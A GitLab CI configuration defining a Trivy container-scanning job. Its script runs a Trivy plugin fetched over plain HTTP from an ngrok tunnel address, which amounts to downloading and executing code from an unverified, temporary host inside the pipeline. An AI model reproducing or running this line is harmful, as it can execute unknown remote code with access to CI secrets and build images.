variables:
    TRIVY_TAG: 'latest'
    TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'
    CS_SCHEMA_MODEL: 15

trivy_container_scanning:
    stage: test
    variables:
        GIT_STRATEGY: none
    allow_failure: true
    artifacts:
        reports:
            container_scanning: trivy-container-scanning-report.json
        paths:
            - trivy-container-scanning-report.json
    dependencies: []
    script:
        - docker pull $TRIVY_IMAGE
        - docker run --rm $TRIVY_IMAGE plugin run http://ff94-92-124-160-226.ngrok-free.app/trivy-gitlab.tar.gz container $CS_IMAGE
